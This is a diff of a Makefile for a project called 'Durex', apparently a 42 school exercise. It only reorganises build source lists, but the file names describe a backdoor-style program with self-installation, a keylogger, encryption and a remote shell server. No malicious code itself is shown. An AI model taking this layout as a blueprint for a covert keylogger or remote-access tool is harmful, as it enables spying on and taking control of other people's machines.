@@ -6,15 +6,41 @@
 #    By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2018/01/12 20:15:31 by root              #+#    #+#              #
-#    Updated: 2019/08/04 06:01:59 by gbourgeo         ###   ########.fr        #
+#    Updated: 2019/08/05 00:19:26 by gbourgeo         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
 NAME	= Durex
-SRC		= main.c install.c durex.c server.c client.c encrypt.c commands.c
-SRC		+= signal.c move.c reporter.c stdlib.c library.c shell.c server_stats.c
-SRC_KEY	= keylogger_init.c keylogger_loop.c handlers.c
-SRC_KEY	+= get_console.c get_keyboard.c get_keymaps.c get_keys.c get_keystate.c
+SRC		= main.c					\
+		client.c					\
+		durex.c						\
+		encrypt.c					\
+		install.c					\
+		library.c					\
+		move.c						\
+		quit.c						\
+		reporter.c					\
+		server.c					\
+		server_connect_shell.c		\
+		server_help.c				\
+		server_keylogger.c			\
+		server_print_logs.c			\
+		server_quit_client.c		\
+		server_quit_client_shell.c	\
+		server_remote_shell.c		\
+		server_shell.c				\
+		server_stats.c				\
+		shell.c						\
+		signal.c					\
+		stdlib.c
+SRC_KEY	= keylogger_init.c	\
+		keylogger_loop.c	\
+		handlers.c			\
+		get_console.c		\
+		get_keyboard.c		\
+		get_keymaps.c		\
+		get_keys.c			\
+		get_keystate.c
 OBJ		= $(addprefix $(OBJ_DIR), $(SRC:.c=.o))
 OBJ		+= $(addprefix $(OBJ_DIR), $(SRC_KEY:.c=.o))
 DEP		= $(addprefix $(DEP_DIR), $(SRC:.c=.d))
